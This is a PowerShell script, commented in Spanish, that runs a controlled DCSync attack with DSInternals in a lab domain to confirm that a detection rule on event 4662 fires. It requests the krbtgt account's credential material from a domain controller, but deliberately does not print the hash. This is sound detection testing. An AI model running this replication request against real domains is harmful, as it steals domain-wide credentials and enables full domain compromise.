<#
    Prueba controlada de DCSync, para validar la regla 7

    Objetivo: comprobar que la deteccion dispara de verdad, no solo que el
    evento 4662 se emite. Se ejecuta en MEMBER01, contra DC01, en un dominio de
    laboratorio propio.

    El detalle que decide si la prueba sirve: runCommand corre como SYSTEM, y
    SYSTEM en una maquina unida al dominio es la cuenta de equipo MEMBER01$. La
    regla descarta a proposito todo lo que termina en $, porque los
    controladores replican entre si de forma legitima. Si se lanzara asi, el
    4662 se registraria y la regla no diria nada, que es justo lo contrario de
    lo que se quiere probar.

    Por eso se pasa -Credential: DSInternals se autentica contra el DC con esa
    cuenta y el evento queda a su nombre.

    No deja nada instalado que no estuviera: DSInternals se instala en el perfil
    del usuario y se puede quitar despues.
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)] [string] $Usuario,
    [Parameter(Mandatory = $true)] [string] $Password,
    [string] $Dominio = 'novashop.local',
    [string] $Netbios = 'NOVASHOP',
    [string] $CuentaObjetivo = 'krbtgt'
)

$ErrorActionPreference = 'Stop'
function Escribir($m) { Write-Output ("[{0:HH:mm:ss}] {1}" -f (Get-Date), $m) }

Escribir "Preparando DSInternals."
if (-not (Get-Module -ListAvailable -Name DSInternals)) {
    # TLS 1.2 explicito: en Server la galeria rechaza el handshake por defecto.
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Install-PackageProvider -Name NuGet -Force -Scope AllUsers | Out-Null
    Install-Module DSInternals -Force -Scope AllUsers -AllowClobber
    Escribir "DSInternals instalado."
}
else {
    Escribir "DSInternals ya estaba."
}
Import-Module DSInternals

$dc = "dc01.$Dominio"
$cred = New-Object System.Management.Automation.PSCredential(
    "$Netbios\$Usuario",
    (ConvertTo-SecureString $Password -AsPlainText -Force))

Escribir "Lanzando el DCSync contra $dc como $Netbios\$Usuario."
Escribir "Esto pide la replicacion de los secretos de '$CuentaObjetivo' por DRSUAPI."

try {
    $r = Get-ADReplAccount -SamAccountName $CuentaObjetivo `
            -Domain $Netbios -Server $dc -Credential $cred -ErrorAction Stop

    Escribir "DCSYNC CORRECTO. El dominio devolvio material de credenciales."
    Escribir "  Cuenta:            $($r.SamAccountName)"
    Escribir "  DistinguishedName: $($r.DistinguishedName)"
    Escribir "  SID:               $($r.Sid)"
    # El hash NO se imprime. Que la replicacion devuelva el objeto ya prueba el
    # ataque; volcarlo al log del despliegue no anade nada y si expone material.
    $tieneHash = $null -ne $r.NTHash
    Escribir "  Material de credenciales recibido: $tieneHash"
}
catch {
    Escribir "El DCSync fallo: $($_.Exception.Message)"
    Escribir "Causa habitual: la cuenta no tiene los derechos de replicacion, o"
    Escribir "SDProp revirtio la ACE plantada en la fase 5."
    throw
}

Escribir ""
Escribir "Deja un 4662 sobre el objeto de dominio con los derechos extendidos"
Escribir "  1131f6aa-...  DS-Replication-Get-Changes"
Escribir "  1131f6ad-...  DS-Replication-Get-Changes-All"
Escribir "La regla es Scheduled cada 5 minutos: la alerta tarda hasta 5 en salir,"
Escribir "mas la latencia de ingesta del evento."
